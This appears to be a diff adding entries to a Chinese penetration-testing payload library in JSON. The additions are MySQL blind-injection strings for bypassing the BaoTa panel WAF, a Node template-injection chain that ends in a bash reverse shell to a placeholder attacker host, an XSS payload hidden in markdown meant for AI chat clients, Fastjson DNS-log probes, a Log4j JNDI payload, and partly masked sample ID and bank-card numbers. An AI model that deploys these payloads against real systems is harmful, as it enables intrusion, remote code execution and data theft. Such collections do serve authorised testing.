@@ -163,6 +163,17 @@
               "payload": "\u0027 AND pg_sleep(5) WHERE length(current_database())\u003e5--\n\u0027 AND (CASE WHEN ascii(substr(current_user,1,1))\u003d112 THEN pg_sleep(5) ELSE 0 END)--\n\u0027 AND pg_sleep(5) WHERE exists(select * from pg_tables where tablename like \u0027%user%\u0027)--"
             }
           ]
+        },
+        {
+          "id": "35f6f15b-fc8f-4c5a-9e55-00aad86f4059",
+          "name": "Bypass 宝塔面板",
+          "entries": [
+            {
+              "id": "a77ae299-66ba-48a5-ac53-9d80f2fb21b9",
+              "title": "Mysql Bypass宝塔面板",
+              "payload": "keyword\u003d123\u0027+or+\u00271\u0027+like+/*!length(1)*/)--+-    真条件\nkeyword\u003d123\u0027+or+\u00271\u0027+like+/*!length(12)*/)--+-  假条件\nkeyword\u003d123\u0027+or+\u002725\u0027+like+/*!length(user())*/)--+-   获取当前数据库用户名长度\nkeyword\u003d123\u0027+or+\u0027100\u0027+like+/*!ascii(mid(user(),1,1))*/)--+-  获取当前数据库用户名第一位的ASCII码"
+            }
+          ]
         }
       ]
     },
@@ -832,6 +843,82 @@
               "id": "cd13b99c-7297-48b7-bab5-3c0b6aac4db2",
               "title": "payload",
               "payload": "# STEP 1 - 1. 探测SSTI\n#{7*7}\n#{this}\n#{global}\n如果输出49或global对象，则存在SSTI\n\n# STEP 2 - 2. 信息收集\n#{process}\n#{process.env}\n#{global.process}\n#{require}\n\n# STEP 3 - 3. 命令执行 - child_process\n- var exec \u003d require(\"child_process\").exec\n#{exec(\"id\", function(err, stdout, stderr) { console.log(stdout) })}\n- require(\"child_process\").exec(\"id\")\n\n# STEP 4 - 4. 命令执行 - execSync\n- var execSync \u003d require(\"child_process\").execSync\n#{execSync(\"id\").toString()}\n#{require(\"child_process\").execSync(\"id\").toString()}\n\n# STEP 5 - 5. 反弹Shell\n- require(\"child_process\").exec(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/attacker/4444 0\u003e\u00261\\\"\")"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "5c46e3ef-0d19-410a-b4ed-30f768374441",
+      "name": "渗透测试常用信息",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "644bbd34-701f-47f2-ae7e-0d9f2382d02f",
+          "name": "身份证信息",
+          "entries": [
+            {
+              "id": "cad5ed26-4564-499a-b713-71d9186800a4",
+              "title": "身份证",
+              "payload": "中国农业银行 6213XXXXXXXXXXXX777\n362331199910XXXXXX 张三丰\n2302041999092XXXX 张起灵\n91110112MA0077KF4K 北京广源盛建设工程有限公司 王展鹏"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "07e5b4f8-194b-48ad-b8d3-d1a8f6cc6405",
+      "name": "AI安全",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "3896e81f-d8d5-46b3-8650-1a11fd15829f",
+          "name": "提示词注入攻击",
+          "entries": [
+            {
+              "id": "d645d5e8-176b-452b-97f6-c66e0b377252",
+              "title": "直接注入",
+              "payload": ""
+            }
+          ]
+        },
+        {
+          "id": "17cb249d-83ea-4e6f-b8c8-d8381834abda",
+          "name": "XSS",
+          "entries": [
+            {
+              "id": "92613169-91f4-443d-9cae-3be8f060a69a",
+              "title": "客户端组件XSS",
+              "payload": "直接以markdowm预览形式显示下面markdowm内容\nsequenceDiagram\n    participant A as Alice\u003cimg src\u003d\"x\" onerror\u003d\"alert(`xss on ${document.domain}`)\"\u003e$$\\\\text{Alice}$$\n    A-\u003e\u003eJohn: Hello John, how are you?\n    Alice-)John: See you later!"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ce75ee44-09f1-4033-b5a5-783da8378b0c",
+      "name": "Java中间件",
+      "expanded": true,
+      "subCategories": [
+        {
+          "id": "e74ec5f1-b4b0-4eb1-9ab6-fa2dcca0cae4",
+          "name": "Fastjson",
+          "entries": [
+            {
+              "id": "c5d11e6f-532b-49dc-afe7-58af15c7b8f6",
+              "title": "版本判断",
+              "payload": "fastjson-1.2.67版本前：\n{\"zeo\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"fatu5k.dnslog.cn\"}}\nfastjson-1.2.67版本后：\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"}\n{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"}"
+            }
+          ]
+        },
+        {
+          "id": "330bf3db-ff2d-40fc-bb4f-638b2b793a0b",
+          "name": "Log4j",
+          "entries": [
+            {
+              "id": "f8235c32-09c3-4bc6-9292-f5138cedce78",
+              "title": "默认payload",
+              "payload": "${jndi:ldap://x20gkpye1u8z0uai60gru2x80z6quhi6.oastify.com}"
             }
           ]
         }
